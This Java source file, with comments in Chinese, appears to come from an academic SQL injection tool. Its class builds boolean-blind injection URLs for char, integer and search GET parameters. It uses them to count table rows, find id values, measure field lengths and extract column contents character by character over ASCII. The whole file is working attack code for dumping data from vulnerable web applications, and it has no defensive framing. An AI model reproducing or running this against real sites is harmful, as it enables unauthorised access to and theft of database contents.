package cn.edu.neu.MJ.SQLInject;

import java.util.ArrayList;
import java.util.List;

import static cn.edu.neu.HJ.GUI.GUIStart.mf;


public class ContentName {
	public List<String> getDoubleList() {
		return doubleList;
	}

	public List<String> getDoubleList1() {
		return doubleList1;
	}

	private List<String> doubleList = new ArrayList<String>();
	private List<String> doubleList1 = new ArrayList<String>();
    
	//猜解id
	public int[] guessID(String tablename, String word,String url,String sqltype) {
		choose r = new choose();
		int numid = 0; //可做为id字段的内容个数
		int i = 0;
		int[] num; //记录id字段的内容
		int temp = 0;
		String teststr="";
		String teststr1="";
		String topurl=url;
	    if(sqltype.equals("charGet")){
	    	teststr="%20and%20'1'='1";
	    	teststr1="'";
	    }else if(sqltype.equals("intGet")){
	    	teststr="%20and%201=1";
	    	teststr1="%20";
	    }
	    else if(sqltype.equals("searchGet")){
	    	teststr="%20and%20'%'='";
	    	teststr1="%'";
		}	
	    System.out.println("开始检测ID个数");
		mf.printSQLInjectProcess("开始检测ID个数");
	    //检测可做为id字段的内容个数
		while (true) {
			String numurl = url+teststr1+"%20and%20((select%20count("+word+")%20from%20"+tablename+")="+i+")"+teststr;// 对应字段内容个数

			mf.printSQLInjectProcess(numurl + "\n");
			//System.out.println(numurl);
			if (r.truth(topurl, numurl)) {
				numid = i;
				 System.out.println("id条目数为" + numid);
				mf.printSQLInjectProcess("表" + tablename + "的id条目数为" + numid + "\n");
				break;
			}
			i++;
		}
		//检测可作为id的字段的内容
		num = new int[numid];
		for (int f = 0; f < numid; f++) {
			for (i = temp; i <= 100; i++) {
				String conurl =url+teststr1+"%20and%20exists(select%20"+word
						+"%20from%20"+tablename+"%20where%20"+word+"="+i+")"+teststr;// /////////////////////////
				//System.out.println(conurl);
				mf.printSQLInjectProcess(conurl + "\n");
				if (r.truth(topurl, conurl)) {
					num[f] = i;
					break;
				}
			}
			System.out.println("*********************第"+f+"位"+i);
			mf.printSQLInjectProcess("*********************第" + f + "位" + i + "\n");
			temp = i + 1;

		}

		return num;
	}
   
	//猜解字段内容
	public ArrayList<String> guseeContent(String tablename, String word,
			String url, int[] id,String idword, String dbtype,String sqltype) {

		choose r = new choose();
		int wordnum = 0;//记录字段的内容个数
		String str = "";//记录内容
		int str1 = 48;//ASCII码对应为0
		ArrayList<String> list = new ArrayList<String>();
		int cnum = 0;
		
		//获取字段的内容个数
		String teststr="";
		String teststr1="";
		String topurl=url;
	    if(sqltype.equals("charGet")){
	    	teststr="%20and%20'1'='1";
	    	teststr1="'";
	    }else if(sqltype.equals("intGet")){
	    	teststr="%20and%201=1";
	    	teststr1="%20";
	    }
	    else if(sqltype.equals("searchGet")){
	    	teststr="%20and%20'%'='";
	    	teststr1="%'";
		}	
		while (true) {
			//判断该字段条目数
			String numurl =url+teststr1+"%20and%20((select%20count("+word+")%20from%20"+tablename+")="+cnum+")"+teststr;
			if (r.truth(topurl, numurl)) {
				wordnum = cnum;
				System.out.println("字段"+word+"条目数为："+wordnum);
				break;
			}
			cnum++;
		}
		//获取字段每个内容的长度
		int[] num = new int[wordnum];//记录每个内容长度

		String lenstr = "len";//根据数据库的类型选择判断长度的方法
		if (dbtype.equals("Oracle"))
			lenstr = "length";
		for (int j = 0; j < wordnum; j++) {
			int t = 0;
			while (t<17) {
				String lenurl =url+teststr1+"%20and%20exists(select%20"+word
						+"%20from%20"+tablename+"%20where%20"+idword+"="+id[j]
						+"%20and%20"+lenstr+"("+word+")="+t+")"+teststr;// 测长度
			//System.out.println("********************************"+lenurl);
				if (r.truth(topurl, lenurl)) {
					System.out.println("++++++++++++++++++++++++++++++"+t);
					num[j] = t;
				System.out.println("++++++++++++++++++++++++++++++id为"+id[j]+"的字段长度=" + num[j]);
					mf.printSQLInjectProcess("++++++++++++++++++++++++++++++id为" + id[j] + "的字段长度=" + num[j] + "\n");
					break;
				}
				t++;
			}
			if (t == 17)
				num[j] = 0;
		}
		//获取字段内容
		int i;
		for (int f = 0; f < wordnum; f++) {//字段中内容的个数
			for (int k = 1; k <= num[f]; k++) {//每个内容的长度
				for (i = str1; i <= (int) 'z'; i++) { //遍历ASCII码表，猜解内容
					String conurl = url + teststr1+"%20and%20exists(select%20" + word
							+"%20from%20"+tablename+"%20where%20"+idword+"="
							+id[f]+"%20and%20left("+word+","+k+")='"+str+(char)i+"')"+teststr;//猜解字段内容的注入语句
					if (r.truth(topurl, conurl)) {//如果字符匹配成功，跳出循环，猜解下一个字
					    System.out.println("*********************第"+k+"位"+(char) i);
						mf.printSQLInjectProcess("*********************第" + k + "位" + (char) i + "\n");
						str = str + (char) i;
						break;
					}
				}
				if (i == (int) 'z' + 1){//如果所猜解的内容超出指定ASCII码的返回，内容赋为null
					str = "null";
					break;
				}
			}
			System.out.println("第" + (f + 1) + "个内容：" + str + "\n");
			mf.printSQLInjectProcess("第" + (f + 1) + "个内容：" + str + "\n");
			//mf.setSQLWordResult("第" + (f + 1) + "个内容：" + str + "\n");
			list.add(str);

			str = "";
		}
		return list;//返回内容的集合
	}

}
